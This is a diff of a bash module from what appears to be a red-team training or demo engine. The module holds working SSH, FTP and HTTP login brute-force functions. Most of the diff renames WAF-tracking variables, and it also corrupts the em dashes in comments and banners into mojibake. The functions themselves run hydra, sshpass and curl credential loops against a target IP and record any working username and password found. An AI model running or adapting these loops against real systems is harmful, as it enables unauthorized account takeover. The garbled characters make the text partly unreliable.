@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
-# Brute-force attacks (SSH, FTP, HTTP) — hydra-accelerated with credential loops.
-# Uses engine primitives: mission_brief, phase_banner, fake_shell, bar, waf_tracker, ops, debrief_card.
+# Brute-force attacks (SSH, FTP, HTTP) โ€” hydra-accelerated with credential loops.
+# Uses engine primitives: mission_brief, phase_banner, fake_shell, bar, http_result, ops, debrief_card.
 # Callbacks: payloads_bruteforce_creds, traffic_form_post, target_ensure_set, results_record.
 # Sourced, not executed.
 
@@ -11,12 +11,12 @@ _bruteforce_sleep() {
 
 bruteforce_ssh() {
     target_ensure_set || { echo "[bruteforce-ssh] No target set."; return 1; }
-    _engine_reset_waf
-    mission_brief "SSH Brute Force" "T1110" "TA0006 — CREDENTIAL ACCESS" "loud"
+    _engine_reset_tracker
+    mission_brief "SSH Brute Force" "T1110" "TA0006 โ€” CREDENTIAL ACCESS" "loud"
     phase_banner "CREDENTIAL ACCESS" "TA0006"
 
     local found="" cred user pass attempt=0 total="${#payloads_bruteforce_creds[@]}"
-    local waf_stats
+    local payload_stats
 
     if command -v hydra >/dev/null 2>&1; then
         local userlist passlist hydra_output hydra_rc
@@ -42,8 +42,8 @@ bruteforce_ssh() {
         done <<< "$hydra_output"
 
         BNB_ENGINE_PAYLOAD_TOTAL="$total"
-        BNB_ENGINE_WAF_BYPASSED="$hydra_found_count"
-        BNB_ENGINE_WAF_BLOCKED=$((total - hydra_found_count))
+        BNB_ENGINE_PASSED="$hydra_found_count"
+        BNB_ENGINE_BLOCKED=$((total - hydra_found_count))
 
         rm -f "$userlist" "$passlist"
     elif command -v sshpass >/dev/null 2>&1; then
@@ -56,33 +56,33 @@ bruteforce_ssh() {
             bar "$attempt" "$total"
 
             if sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -p 2222 "${user}@${TARGET_IP}" true 2>/dev/null; then
-                waf_tracker "200" "ssh:${user}:${pass}"
+                http_result "200" "ssh:${user}:${pass}"
                 printf '\n'
                 echo "[SUCCESS] ${user}:${pass} (attempt ${attempt}/${total})"
                 found="${user}:${pass}"
                 break
             else
-                waf_tracker "403" "ssh:${user}:${pass}"
+                http_result "403" "ssh:${user}:${pass}"
             fi
             _bruteforce_sleep
         done
         printf '\n'
     else
-        waf_stats="blocked:0  bypassed:0  total:0"
-        results_record "bruteforce_ssh" "FAILED" "loud" "" "$waf_stats" "no hydra/sshpass available"
+        payload_stats="blocked:0  bypassed:0  total:0"
+        results_record "bruteforce_ssh" "FAILED" "loud" "" "$payload_stats" "no hydra/sshpass available"
         ops "loud"
         debrief_card "FAILED" "T1110" "loud"
         return 1
     fi
 
-    waf_stats="blocked:${BNB_ENGINE_WAF_BLOCKED}  bypassed:${BNB_ENGINE_WAF_BYPASSED}  total:${BNB_ENGINE_PAYLOAD_TOTAL}"
+    payload_stats="blocked:${BNB_ENGINE_BLOCKED}  bypassed:${BNB_ENGINE_PASSED}  total:${BNB_ENGINE_PAYLOAD_TOTAL}"
 
     if [ -n "$found" ]; then
-        results_record "bruteforce_ssh" "SUCCESS" "loud" "TA0006" "$waf_stats" "credentials found: ${found}"
+        results_record "bruteforce_ssh" "SUCCESS" "loud" "TA0006" "$payload_stats" "credentials found: ${found}"
         ops "loud"
         debrief_card "SUCCESS" "T1110" "loud"
     else
-        results_record "bruteforce_ssh" "FAILED" "loud" "TA0006" "$waf_stats" "no working SSH credentials found"
+        results_record "bruteforce_ssh" "FAILED" "loud" "TA0006" "$payload_stats" "no working SSH credentials found"
         ops "loud"
         debrief_card "FAILED" "T1110" "loud"
     fi
@@ -90,12 +90,12 @@ bruteforce_ssh() {
 
 bruteforce_ftp() {
     target_ensure_set || { echo "[bruteforce-ftp] No target set."; return 1; }
-    _engine_reset_waf
-    mission_brief "FTP Brute Force" "T1110" "TA0006 — CREDENTIAL ACCESS" "loud"
+    _engine_reset_tracker
+    mission_brief "FTP Brute Force" "T1110" "TA0006 โ€” CREDENTIAL ACCESS" "loud"
     phase_banner "CREDENTIAL ACCESS" "TA0006"
 
     local found="" cred user pass attempt=0 total="${#payloads_bruteforce_creds[@]}"
-    local waf_stats
+    local payload_stats
 
     if command -v hydra >/dev/null 2>&1; then
         local userlist passlist hydra_output hydra_rc
@@ -121,8 +121,8 @@ bruteforce_ftp() {
         done <<< "$hydra_output"
 
         BNB_ENGINE_PAYLOAD_TOTAL="$total"
-        BNB_ENGINE_WAF_BYPASSED="$hydra_found_count"
-        BNB_ENGINE_WAF_BLOCKED=$((total - hydra_found_count))
+        BNB_ENGINE_PASSED="$hydra_found_count"
+        BNB_ENGINE_BLOCKED=$((total - hydra_found_count))
 
         rm -f "$userlist" "$passlist"
     else
@@ -135,27 +135,27 @@ bruteforce_ftp() {
             bar "$attempt" "$total"
 
             if curl -s --connect-timeout 3 "ftp://${user}:${pass}@${TARGET_IP}:2121/" -o /dev/null; then
-                waf_tracker "200" "ftp:${user}:${pass}"
+                http_result "200" "ftp:${user}:${pass}"
                 printf '\n'
                 echo "[SUCCESS] ${user}:${pass} (attempt ${attempt}/${total})"
                 found="${user}:${pass}"
                 break
             else
-                waf_tracker "403" "ftp:${user}:${pass}"
+                http_result "403" "ftp:${user}:${pass}"
             fi
             _bruteforce_sleep
         done
         printf '\n'
     fi
 
-    waf_stats="blocked:${BNB_ENGINE_WAF_BLOCKED}  bypassed:${BNB_ENGINE_WAF_BYPASSED}  total:${BNB_ENGINE_PAYLOAD_TOTAL}"
+    payload_stats="blocked:${BNB_ENGINE_BLOCKED}  bypassed:${BNB_ENGINE_PASSED}  total:${BNB_ENGINE_PAYLOAD_TOTAL}"
 
     if [ -n "$found" ]; then
-        results_record "bruteforce_ftp" "SUCCESS" "loud" "TA0006" "$waf_stats" "credentials found: ${found}"
+        results_record "bruteforce_ftp" "SUCCESS" "loud" "TA0006" "$payload_stats" "credentials found: ${found}"
         ops "loud"
         debrief_card "SUCCESS" "T1110" "loud"
     else
-        results_record "bruteforce_ftp" "FAILED" "loud" "TA0006" "$waf_stats" "no working FTP credentials found"
+        results_record "bruteforce_ftp" "FAILED" "loud" "TA0006" "$payload_stats" "no working FTP credentials found"
         ops "loud"
         debrief_card "FAILED" "T1110" "loud"
     fi
@@ -163,12 +163,12 @@ bruteforce_ftp() {
 
 bruteforce_http() {
     target_ensure_set || { echo "[bruteforce-http] No target set."; return 1; }
-    _engine_reset_waf
-    mission_brief "HTTP Login Brute Force" "T1110" "TA0006 — CREDENTIAL ACCESS" "loud"
+    _engine_reset_tracker
+    mission_brief "HTTP Login Brute Force" "T1110" "TA0006 โ€” CREDENTIAL ACCESS" "loud"
     phase_banner "CREDENTIAL ACCESS" "TA0006"
 
     local found="" cred user pass code response attempt=0 total="${#payloads_bruteforce_creds[@]}"
-    local waf_stats
+    local payload_stats
 
     printf '\033[1;32mroot@kali:~#\033[0m \033[1mhydra -L users.txt -P passes.txt %s http-post-form "/login:username=^USER^&password=^PASS^:F=403"\033[0m\n' \
         "${TARGET_IP}:${TARGET_PORT:-8080}"
@@ -183,26 +183,26 @@ bruteforce_http() {
         code="$(echo "$response" | tail -1)"
 
         if [ "$code" = "200" ]; then
-            waf_tracker "$code" "http:${user}:${pass}"
+            http_result "$code" "http:${user}:${pass}"
             printf '\n'
             echo "[SUCCESS] ${user}:${pass} (HTTP ${code}, attempt ${attempt}/${total})"
             found="${user}:${pass}"
             break
         else
-            waf_tracker "$code" "http:${user}:${pass}"
+            http_result "$code" "http:${user}:${pass}"
         fi
         _bruteforce_sleep
     done
     printf '\n'
 
-    waf_stats="blocked:${BNB_ENGINE_WAF_BLOCKED}  bypassed:${BNB_ENGINE_WAF_BYPASSED}  total:${BNB_ENGINE_PAYLOAD_TOTAL}"
+    payload_stats="blocked:${BNB_ENGINE_BLOCKED}  bypassed:${BNB_ENGINE_PASSED}  total:${BNB_ENGINE_PAYLOAD_TOTAL}"
 
     if [ -n "$found" ]; then
-        results_record "bruteforce_http" "SUCCESS" "loud" "TA0006" "$waf_stats" "credentials found: ${found}"
+        results_record "bruteforce_http" "SUCCESS" "loud" "TA0006" "$payload_stats" "credentials found: ${found}"
         ops "loud"
         debrief_card "SUCCESS" "T1110" "loud"
     else
-        results_record "bruteforce_http" "FAILED" "loud" "TA0006" "$waf_stats" "no working HTTP credentials found"
+        results_record "bruteforce_http" "FAILED" "loud" "TA0006" "$payload_stats" "no working HTTP credentials found"
         ops "loud"
         debrief_card "FAILED" "T1110" "loud"
     fi
